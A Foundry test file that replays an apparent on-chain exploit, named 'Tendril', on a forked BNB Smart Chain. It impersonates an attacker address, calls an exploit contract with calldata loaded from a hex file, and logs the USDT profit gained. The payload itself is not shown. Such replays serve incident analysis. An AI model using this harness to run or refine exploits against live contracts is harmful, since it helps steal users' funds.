// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";

contract TendrilReplayTest is Test {
    address constant ATTACKER = 0xB81e4aaFA347b27112B7f6F5DE6cf7cD516021ff;
    address constant EXPLOIT = 0xc8Cb6A2aA825a576e1470479046056fe414eE0f8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PROFIT = 0xB87CF5AB84d0ab9545358cD30229627305331373;

    function test_replay() public {
        uint256 fork = vm.createFork("bsc", 131653426);
        vm.selectFork(fork);
        uint256 before = IERC20(USDT).balanceOf(PROFIT);
        console2.log("profit USDT before:", before);

        bytes memory data = vm.parseBytes(vm.readFile("test/data/tendril.hex"));
        vm.startPrank(ATTACKER);
        (bool ok, bytes memory ret) = EXPLOIT.call(data);
        vm.stopPrank();
        console2.log("call ok:", ok);
        if (!ok) console2.logBytes(ret);

        uint256 afterBal = IERC20(USDT).balanceOf(PROFIT);
        console2.log("profit USDT after:", afterBal);
        console2.log("profit raw (18 decimals):", afterBal - before);
        assertTrue(ok);
    }
}
interface IERC20 { function balanceOf(address) external view returns (uint256); }

